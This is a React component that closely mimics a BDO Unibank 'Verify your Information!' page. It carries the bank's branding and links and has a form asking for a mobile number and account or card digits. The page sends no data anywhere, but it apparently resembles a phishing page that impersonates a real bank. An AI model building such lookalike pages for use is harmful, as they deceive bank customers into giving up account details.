"use client";

import React from 'react';
import { FaUser } from 'react-icons/fa';

const verifyPage: React.FC = () => {
  return (
    <div style={{
      minWidth: '1000px',
      width: '100%',
      margin: 'auto',
      fontFamily: 'Roboto Regular',
      textAlign: 'left',
      padding: 0,
      height: '100%'
    }}>
      {/* Previous header code remains the same */}
      <div style={{
        minWidth: '1000px',
        width: '100%',
        margin: 'auto'
      }}>
        {/* Header section remains unchanged */}
        <div style={{
          padding: '20px 0',
          width: '95%',
          position: 'relative',
          marginLeft: 'auto',
          marginRight: 'auto',
          height: '81px',
          zIndex: 100
        }}>
          {/* Header content remains unchanged */}
          <div id="contentTop">
            <div style={{
              width: '178px',
              height: '81px',
              float: 'left'
            }}>
              <div style={{
                margin: '0 auto',
                display: 'block',
                width: '178px',
                height: '81px'
              }}>
                <a 
                  href="http://www.bdo.com.ph/" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  style={{
                    display: 'block',
                    width: '151px',
                    height: '81px',
                    position: 'relative',
                    left: '200px',
                    textDecoration: 'none',
                  }}
                >
                  <span style={{visibility: 'hidden'}}>Banco De Oro</span>
                </a>
              </div>
            </div>
            
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                width: '167px',
                height: '28px',
                position: 'relative',
                float: 'right',
                right: '275px',
                borderRadius: '6px',
                fontSize: '6pt',
                background: '#f7af19',
                zIndex: 99,
                fontWeight: 'normal',
                top: '-17px',
              }}
            >
              <a
                href="https://www.bdo.com.ph/"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  color: '#fff',
                  textDecoration: 'none',
                  fontSize: '10px',
                  textAlign: 'center',
                }}
              >
                <FaUser size={16} style={{ marginRight: '5px' }} />
                <span>GO BACK TO BDO.COM.PH</span>
              </a>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div style={{width: '950px', margin: '0 auto'}}>
          <div style={{
            float: 'left',
            width: '100%',
            borderTop: 0,
            minHeight: '400px',
            marginBottom: '50px',
            border: '5px solid #1e4f8e',
            borderRadius: '10px',
            background: '#ffffff'
          }}>
            <div style={{
              borderRadius: '5px 5px 0 0',
              position: 'relative'
            }}>
              <div style={{padding: '5px 5px 12px'}}>
                <h2 style={{
                  margin: 0,
                  paddingLeft: 0,
                  fontStyle: 'normal',
                  color: '#1D587F',
                  fontSize: '12px'
                }}>
                  <span>Verify your Information!</span>
                </h2>
                
                <div style={{width: '500px', textAlign: 'left'}}>
                  <form onSubmit={(e) => e.preventDefault()} autoComplete="off">
                    <input type="hidden" name="step" value="otpform" />
                    
                    <div style={{marginBottom: '28px'}}>  
                      <label style={{
                        padding: 0,
                        width: '20%',
                        paddingRight: '2em',
                        color: '#717171',
                        fontWeight: 'normal',
                        textAlign: 'left',
                        fontSize: '12px'
                      }}>
                        Enter required information below.
                      </label>
                    </div>
                  </form>
                </div>

                <div style={{
                  border: '1px solid #808080',
                  borderRadius: '10px',
                  overflow: 'hidden',
                  maxWidth: '905px'
                }}>
                  <div style={{
                    background: '#1e4f8e',
                    color: '#ffffff',
                    padding: '5px 5px',
                    fontSize: '12px',
                    fontWeight: 'bold',
                  }}>
                    Online Banking Account Information
                  </div>

                  <form onSubmit={(e) => e.preventDefault()} autoComplete="off">
                    <table style={{width: '100%', borderCollapse: 'collapse'}}>
                      <tbody>
                        <tr>
                          <td style={{width: '150px', padding: '0px 0 5px 5px', verticalAlign: 'top'}}>
                            <label style={{
                              color: '#808080',
                              fontSize: '12px',
                              fontWeight: 'normal'
                            }}>
                              Mobile Number
                            </label>
                          </td>
                          <td style={{padding: '0px 85px 0'}}>
                            <input 
                              type="text"
                              style={{
                                width: '140px',
                                height: '16px',
                                border: '1px solid #cccccc',
                                borderRadius: '0',
                                padding: '2px 5px',
                                fontSize: '11px',
                                backgroundColor: '#FDF9BE',
                                textAlign: 'left'
                              }}
                            />
                          </td>
                        </tr>
                        <tr>
                          <td style={{width: '150px', padding: '5px 0 0 5px', verticalAlign: 'top'}}>
                            <label style={{
                              color: '#808080',
                              fontSize: '12px',
                              fontWeight: 'normal'
                            }}>
                              Account/Card Number*
                            </label>
                          </td>
                          <td style={{padding: '0px 85px 0'}}>
                            <input 
                              type="text"
                              style={{
                                width: '140px',
                                height: '16px',
                                border: '1px solid #cccccc',
                                borderRadius: '0',
                                padding: '2px 5px',
                                fontSize: '11px',
                                backgroundColor: '#FDF9BE',
                                textAlign: 'left',
                              }}
                            />
                          </td>
                        </tr>
                        <tr>
                          <td></td>
                          <td style={{padding: '0 100px'}}>
                            <div style={{
                              fontSize: '10px',
                              color: '#808080',
                              fontStyle: 'italic',
                              paddingLeft: '5px',
                              marginLeft:'-250px',
                            }}>
                              *Enter the last 4 digits of your BDO Debit Card or Checking/Savings account enrolled in BDO Online Banking
                            </div>
                          </td>
                        </tr>
                      </tbody>
                    </table>

                    <div style={{
                      display: 'flex',
                      gap: '2px',
                      justifyContent: 'center',
                      margin: '20px 0'
                    }}>
                      <button
                        style={{
                          padding: '2px 10px',
                          background: '#f7af19',
                          border: 'none',
                          borderRadius: '4px',
                          color: '#666666',
                          fontSize: '11px',
                          cursor: 'pointer',
                          fontWeight: 'bold',
                          height: '20px'
                        }}
                      >
                        Back
                      </button>
                      <button
                        style={{
                          padding: '2px 10px',
                          background: '#f7af19',
                          border: 'none',
                          borderRadius: '4px',
                          color: '#666666',
                          fontSize: '11px',
                          cursor: 'pointer',
                          fontWeight: 'bold',
                          height: '20px'
                        }}
                      >
                        Submit
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          margin: '15px auto',
          borderTop: '1px solid #ddd',
          width: '980px',
          clear: 'both'
        }}>
          <div style={{
            fontSize: '10px',
            color: '#999999',
            margin: '0 0 0 30px',
            float: 'left',
            paddingTop: '28px'
          }}>
            BDO Unibank, Inc. © 2015. All Rights Reserved
          </div>
          <div style={{
            width: '700px',
            margin: '0 auto',
            paddingTop: '28px',
            textAlign: 'center',
            float: 'right',
            fontSize: '10px'
          }}>
            {[{
              href: "https://www.bdo.com.ph/about-bdo/business-operations", text: "About BDO"
            }, {
              href: "http://www.bdo.com.ph/corporate-governance", text: "Corporate Governance"
            }, {
              href: "http://www.bdo.com.ph/investor-relations/official-disclosures", text: "Investor Relations"
            }, {
              href: "https://www.careers.bdo.com.ph/", text: "Careers"
            }, {
              href: "https://www.bdo.com.ph/news-and-articles", text: "Press Room"
            }, {
              href: "http://www.bdo.com.ph/hong-kong-home", text: "Hongkong"
            }, {
              href: "https://www.bdo.com.ph/site-map", text: "Site Map"
            }, {
              href: "http://www.bdo.com.ph/privacy-statement", text: "Privacy Policy"
            }].map((link, index) => (
              <a 
                key={index}
                href={link.href} 
                target="_blank" 
                rel="noopener noreferrer" 
                style={{
                  margin: '0 10px',
                  fontSize: '10px',
                  color: '#999999',
                  textDecoration: 'none'
                }}
              >
                {link.text}
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default verifyPage;